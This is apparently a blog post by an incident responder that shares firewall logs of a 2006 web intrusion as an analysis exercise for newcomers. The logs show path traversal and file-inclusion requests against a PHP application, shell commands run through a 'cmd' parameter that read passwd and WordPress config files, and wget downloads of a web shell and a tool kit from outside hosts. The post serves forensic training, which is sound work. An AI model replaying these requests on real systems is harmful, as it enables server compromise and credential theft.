@@ -1,0 +1,149 @@
+I constantly get people asking what it's like doing this kind of work, and how I got into it. I know when I started this stuff I thought I'd be chasing 31337 hackers, and I found myself chasing lamers day in and day out.
+
+Here is some lamer traffic for you newbies to look at and analyze. Let me know what you think the attacker did, and how far he got into the system.
+
+============================================
+<189>Nov 11 2006 15:58:48: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/images
+<189>Nov 11 2006 15:58:49: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/images/
+<189>Nov 11 2006 15:58:50: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/icons/folder.gif
+<189>Nov 11 2006 15:59:31: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/images/blue/
+<189>Nov 11 2006 15:59:32: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/icons/image2.gif
+<189>Nov 11 2006 16:01:01: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/configuration
+<189>Nov 11 2006 16:01:07: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/config
+<189>Nov 11 2006 16:01:12: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/config.php
+<189>Nov 11 2006 16:01:25: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/server_settings.php
+<189>Nov 11 2006 16:01:53: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/attachments
+<189>Nov 11 2006 16:02:00: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin
+<189>Nov 11 2006 16:02:09: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php
+<189>Nov 11 2006 16:02:13: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=attachments
+<189>Nov 11 2006 16:02:16: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=templates
+<189>Nov 11 2006 16:02:31: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=settings
+<189>Nov 11 2006 16:02:38: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=settings../
+<189>Nov 11 2006 16:02:46: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=../settings
+<189>Nov 11 2006 16:03:02: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=../../../../../../etc/passwd
+<189>Nov 11 2006 16:03:08: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=../../../../../../etc/passwd%00
+<189>Nov 11 2006 16:03:26: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=topts
+<189>Nov 11 2006 16:03:30: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=users
+<189>Nov 11 2006 16:03:35: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=theme
+<189>Nov 11 2006 16:03:39: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=pager
+<189>Nov 11 2006 16:03:43: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=kbase
+<189>Nov 11 2006 16:03:46: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=attachments
+<189>Nov 11 2006 16:03:48: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=templates
+<189>Nov 11 2006 16:03:53: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php? tpl=Please+Select+a+Template+to+Edit+.+.+.&t=templates&restore_tpl=Restore+Templates
+<189>Nov 11 2006 16:04:57: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common
+<189>Nov 11 2006 16:04:57: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/
+<189>Nov 11 2006 16:06:22: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/whosonline.php
+<189>Nov 11 2006 16:10:26: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/logout.php?database=http://cgi.cs.kent.edu/ ~pwang/php/store/images/14.txt%00
+<189>Nov 11 2006 16:10:26: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/index.php
+<189>Nov 11 2006 16:13:15: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../ etc/passwd%00
+<189>Nov 11 2006 16:15:23: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/admin/control.php?t=attachments
+<189>Nov 11 2006 16:15:55: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp
+<189>Nov 11 2006 16:18:56: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la
+<189>Nov 11 2006 16:20:16: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=uname%20-a
+<189>Nov 11 2006 16:20:30: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=finger
+<189>Nov 11 2006 16:20:51: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20la%20../
+<189>Nov 11 2006 16:21:03: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../
+<189>Nov 11 2006 16:21:43: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../
+<189>Nov 11 2006 16:23:00: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../lang
+<189>Nov 11 2006 16:25:34: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=wget%20-O%20../lang/lan.txt.gz%20http://rst.void.ru/download/r57shell.txt.gz
+<189>Nov 11 2006 16:25:41: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../lang
+<189>Nov 11 2006 16:25:42: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/favicon.ico
+<189>Nov 11 2006 16:25:57: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../lang
+<189>Nov 11 2006 16:25:58: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/favicon.ico
+<189>Nov 11 2006 16:26:11: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../
+<189>Nov 11 2006 16:26:41: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20config.php
+<189>Nov 11 2006 16:27:20: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../wordpress
+<189>Nov 11 2006 16:27:54: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/wordpress/test.php
+<189>Nov 11 2006 16:28:16: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress
+<189>Nov 11 2006 16:28:17: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/
+<189>Nov 11 2006 16:28:18: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/wp-content/themes/default/style.css
+<189>Nov 11 2006 16:28:20: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/wp-content/themes/default/images/ kubrickheader.jpg
+<189>Nov 11 2006 16:28:20: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/wp-content/themes/default/images/kubrickbg.jpg
+<189>Nov 11 2006 16:28:20: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/wp-content/themes/default/images/ kubrickbgcolor.jpg
+<189>Nov 11 2006 16:28:20: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/wp-content/themes/default/images/ kubrickfooter.jpg
+<189>Nov 11 2006 16:28:26: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/test.php
+<189>Nov 11 2006 16:28:27: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/test.php?=PHPE9568F34-D428-11d2-A769- 00AA001ACF42
+<189>Nov 11 2006 16:28:27: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/wordpress/test.php?=PHPE9568F35-D428-11d2-A769- 00AA001ACF42
+<189>Nov 11 2006 16:29:24: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20../../wordpress/wp-config.php
+<189>Nov 11 2006 16:30:37: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20../../../
+<189>Nov 11 2006 16:30:49: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../
+<189>Nov 11 2006 16:31:08: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/cgi-bin
+<189>Nov 11 2006 16:31:12: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../cgi-bin
+<189>Nov 11 2006 16:31:20: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../../
+<189>Nov 11 2006 16:32:08: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../../account
+<189>Nov 11 2006 16:33:00: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20../../../../etc/passwd
+<189>Nov 11 2006 16:33:13: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20../../../../../etc/passwd
+<189>Nov 11 2006 16:34:39: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../../
+<189>Nov 11 2006 16:34:45: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=id
+<189>Nov 11 2006 16:34:53: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../../root
+<189>Nov 11 2006 16:37:33: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=fing%20/% 20.bash_history
+<189>Nov 11 2006 16:38:15: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=ps%20-f
+<189>Nov 11 2006 16:38:37: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=find%20/%20.bash_history
+<189>Nov 11 2006 16:39:15: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=find%20.bash_history
+<189>Nov 11 2006 16:39:25: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=find%20/%20.bash_history
+<189>Nov 11 2006 16:39:49: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/proc
+<189>Nov 11 2006 16:40:38: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/etc
+<189>Nov 11 2006 16:41:06: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/etc/.pwd.lock
+<189>Nov 11 2006 16:41:28: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=hostname
+<189>Nov 11 2006 16:41:34: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=hostname%20-i
+<189>Nov 11 2006 16:41:49: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ifconfig
+<189>Nov 11 2006 16:42:37: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20passwd.OLD
+<189>Nov 11 2006 16:42:48: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20php.ini
+<189>Nov 11 2006 16:43:02: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/etc/passwd.OLD
+<189>Nov 11 2006 16:43:44: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/etc/php.ini
+<189>Nov 11 2006 16:44:23: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/etc/pwdb.conf
+<189>Nov 11 2006 16:45:37: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/etc/pwdb.conf
+<189>Nov 11 2006 16:45:43: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/etc/shells
+<189>Nov 11 2006 16:46:08: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/
+<189>Nov 11 2006 16:46:40: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=finger
+<189>Nov 11 2006 16:47:30: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20.bash_history
+<189>Nov 11 2006 16:48:17: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../../
+<189>Nov 11 2006 16:48:37: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=%20pwd%20../../../../
+<189>Nov 11 2006 16:48:56: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20../../../../../
+<189>Nov 11 2006 16:49:43: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/etc
+<189>Nov 11 2006 16:50:13: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/c:eproject2.metadata.pluginsorg.eclipse.wst.server.coretmp0webappsCMECF_OWSWEB-INFattachments
+<189>Nov 11 2006 16:50:40: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/root
+<189>Nov 11 2006 16:51:01: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/proc
+<189>Nov 11 2006 16:52:54: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=netstat%20-a
+<189>Nov 11 2006 16:56:17: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ps%20-f
+<189>Nov 11 2006 16:59:32: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=wget%20-O%20/tmp/11232.tgz%20http://satanic.easycoding.org/release/itx-ng-0.1-rc2.tgz
+<189>Nov 11 2006 16:59:59: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/
+<189>Nov 11 2006 17:01:07: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp
+<189>Nov 11 2006 17:01:37: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cat%20/tmp/mapping-root
+<189>Nov 11 2006 17:02:25: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:03:10: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=mv%20/tmp/11232.tgz%20/tmp/.ICE-unix/11232.tgz
+<189>Nov 11 2006 17:03:16: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:03:17: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/favicon.ico
+<189>Nov 11 2006 17:03:25: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp/
+<189>Nov 11 2006 17:04:45: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=mv%20/tmp/tmp.lang.php%20/tmp/.ICE-unix/tmp.lang.php
+<189>Nov 11 2006 17:05:15: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:05:27: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:05:28: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/favicon.ico
+<189>Nov 11 2006 17:07:08: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=mv%20/tmp/tmp.lang.php%20/tmp/.ICE-unix/tmp.lang.php
+<189>Nov 11 2006 17:07:24: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=mv%20/tmp/tmp.lang.php%20/tmp/.ICE-unix/tmp.lang.php
+<189>Nov 11 2006 17:07:25: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/favicon.ico
+<189>Nov 11 2006 17:07:41: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:07:48: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:07:49: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/favicon.ico
+<189>Nov 11 2006 17:13:13: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=cp%20/tmp/tmp.lang.php%20/tmp/.ICE-unix/tmp.lang.php
+<189>Nov 11 2006 17:13:35: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp
+<189>Nov 11 2006 17:14:11: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:14:35: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:14:41: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/
+<189>Nov 11 2006 17:15:14: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=rm%20[-fri]%20/tmp/tmp.lang.php
+<189>Nov 11 2006 17:15:27: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp
+<189>Nov 11 2006 17:31:11: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:52:07: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=tar%20-xvzf%20/tmp/.ICE-unix/11232.tgz
+<189>Nov 11 2006 17:52:14: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:53:31: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=tar%20-xvzf%20/tmp/.ICE-unix/11232.tgz
+<189>Nov 11 2006 17:53:53: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/
+<189>Nov 11 2006 17:54:07: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/tmp/.ICE-unix
+<189>Nov 11 2006 17:56:56: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la%20/
+<189>Nov 11 2006 17:57:00: %Customer_PIX: Attacker_IP Accessed URL Target_IP:/oz/common/login.php?default_language=../../../../../../../tmp/.ICE-unix/tmp&cmd=ls%20-la
+
+
+============================================
+
+C'mon first responders - let me know what you come up with.
+
+j0e
